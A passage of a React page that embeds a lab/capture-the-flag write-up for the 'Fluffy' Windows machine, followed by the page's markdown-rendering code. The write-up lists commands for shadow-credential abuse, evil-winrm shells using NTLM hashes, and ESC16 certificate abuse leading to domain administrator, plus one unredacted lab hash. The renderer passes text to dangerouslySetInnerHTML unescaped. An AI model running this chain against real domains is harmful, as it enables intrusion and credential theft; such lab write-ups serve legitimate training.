certipy shadow auto -u p.agila@DC01.fluffy.htb -p 'prom<REDACTED>' -dc-ip 10.129.71.158 -account ldap_svc
faketime "$(ntpdate -q 10.129.71.158 | cut -d ' ' -f 1,2)" certipy shadow auto -u p.agila@DC01.fluffy.htb -p 'prom<REDACTED>' -dc-ip 10.129.71.158 -account winrm_svc
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/14.png)

Authenticating as \`winrm_svc\` and retrieving the user flag. WinRM (Windows Remote Management) allows us to establish a remote shell on the target machine using the extracted service account credentials.
\`\`\`bash
evil-winrm -i 10.129.71.158 -u "winrm_svc" -H '33bd<REDACTED>'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/15.png)

## Privilege Escalation
Trying to find a vulnerability with the \`winrm_svc\` credential. We use certipy to scan for certificate-related vulnerabilities that could be exploited for privilege escalation, focusing on Active Directory Certificate Services misconfigurations.
\`\`\`bash
certipy find -u winrm_svc@10.129.71.158 -hashes '33bd<REDACTED>' -vulnerable -stdout
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/16.png)

We can see that the user \`winrm_svc\` also have \`GenericWrite\` to the others svc accounts. This means we can continue our lateral movement by extracting credentials from other service accounts, building a chain of compromised accounts.
![Kerbrute User Enumeration](/images/writeups/fluffy/17.png)

Using certipy, we can retrieve the \`ca_svc\` credential. The ca_svc account is particularly interesting as it likely has privileges related to the Certificate Authority, which could be exploited for domain compromise.
\`\`\`bash
faketime "$(ntpdate -q 10.129.71.158 | cut -d ' ' -f 1,2)" certipy shadow auto -u winrm_svc@DC01.fluffy.htb -hashes '33bd<REDACTED>' -dc-ip 10.129.71.158 -account ca_svc
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/18.png)

Using certipy, we can retrieve the \`ldap_svc\` credential. The ldap_svc account may have additional privileges within the LDAP service that could be useful for further enumeration and exploitation.
\`\`\`bash
faketime "$(ntpdate -q 10.129.71.158 | cut -d ' ' -f 1,2)" certipy shadow auto -u winrm_svc@DC01.fluffy.htb -hashes '33bd<REDACTED>' -dc-ip 10.129.71.158 -account ldap_svc 
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/19.png)

Enumerating the certificates vulnerability again, but with the \`ca_svc\` account we gonna see that the \`fluffy-DC01-CA\` certificate it's vulnerable to ESC16. ESC16 is a critical vulnerability in Active Directory Certificate Services that allows attackers to request certificates for any user in the domain, including domain administrators.
\`\`\`bash
certipy find -u ca_svc@10.129.71.158 -hashes 'ca0f<REDACTED>' -vulnerable -stdout
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/20.png)
![Kerbrute User Enumeration](/images/writeups/fluffy/28.png)

Following the steps on the certipy documentation to exploit the ESC16 vulnerability. This attack involves modifying the User Principal Name (UPN) of a service account to impersonate a high-privileged user, then requesting a certificate for that user.
\`\`\`
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally
\`\`\`

Change the \`uPN\` to \`administrator\` of the \`ca_svc\` user. By changing the UPN, we can trick the Certificate Authority into issuing a certificate for the administrator account, which we can then use to authenticate as the domain administrator.
\`\`\`bash
certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f<REDACTED>' -dc-ip '10.129.246.224' -user 'ca_svc' read
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/21.png)

Enumerating the \`uPN\` from \`ca_svc\` account. We update the UPN to impersonate the administrator account, which is the first step in the ESC16 exploitation process.
\`\`\`bash
certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f<REDACTED>' -dc-ip '10.129.246.224' -upn 'administrator' -user 'ca_svc' update
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/22.png)

Authenticating as \`ca_svc\` and exporting the \`ca_svc.ccache\` file. We authenticate using the modified UPN and export the Kerberos ticket cache, which will be used to request the administrator certificate.
\`\`\`bash
faketime "$(ntpdate -q 10.129.246.224 | cut -d ' ' -f 1,2)" certipy shadow auto -u ca_svc@DC01.fluffy.htb -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.246.224 -account ca_svc
export KRB5CCNAME=ca_svc.ccache
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/23.png)

Requesting the administrator certificate, that will return the \`administrator.pfx\` file. Using our modified UPN, we request a certificate for the administrator account, which the vulnerable Certificate Authority will issue due to the ESC16 misconfiguration.
\`\`\`bash
faketime "$(ntpdate -q 10.129.246.224 | cut -d ' ' -f 1,2)" certipy req -k -dc-ip '10.129.246.224' -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/24.png)

### Root Flag
Returning the \`uPN\` from \`ca_svc\` to default. It's important to restore the original UPN to avoid detection and maintain the integrity of the service account for potential future use.
\`\`\`bash
certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f<REDACTED>' -dc-ip '10.129.246.224' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/25.png)

Dumping the administrator hash from \`administrator.pfx\` file. We extract the NTLM hash from the administrator certificate, which we can use to authenticate as the domain administrator without needing the actual password.
\`\`\`bash
faketime "$(ntpdate -q 10.129.246.224 | cut -d ' ' -f 1,2)" certipy auth -dc-ip '10.129.246.224' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/26.png)

Authenticating as Administrator and retrieving the root flag. With the extracted administrator hash, we can now authenticate as the domain administrator and access the root flag, completing the full domain compromise.
\`\`\`bash
evil-winrm -i 10.129.71.158 -u Administrator -H '8da8<REDACTED>'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/27.png)
`
  };

  return (
    <motion.div 
      className="writeup-detail-page"
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6 }}
    >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1>{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/fluffy/machine.png" alt="Fluffy Walkthrough" className="machine-image" />
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      <div className="writeup-layout">
        <motion.div 
          className="writeup-content"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.6 }}
        >
          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{line.substring(2)}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{line.substring(3)}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{line.substring(4)}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <pre key={i}>
                      <code className={language ? `language-${language}` : ''}>
                        {codeLines.join('\n')}
                      </code>
                    </pre>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.includes('<InfoStatus')) {
                  // Handle InfoStatus component
                  const match = line.match(/<InfoStatus title="(.*?)" message="(.*?)" \/>/);
                  if (match) {
                    const [, title, message] = match;
                    elements.push(
                      <InfoStatus key={i} title={title} message={message} />
                    );
                  }
                } else if (line.trim() === '') {
                  elements.push(<br key={i} />);
                } else {
                  // Process inline markdown
                  const processedLine = line
                    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') // Bold
                    .replace(/\*(.*?)\*/g, '<em>$1</em>') // Italic
                    .replace(/`(.*?)`/g, '<code class="inline-code">$1</code>'); // Inline code
                  
                  elements.push(
                    <p key={i} dangerouslySetInnerHTML={{ __html: processedLine }} />
                  );
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
        <TableOfContents content={writeup.content} />
      </div>
    </motion.div>
  );
};

export default FluffyWalkthrough;
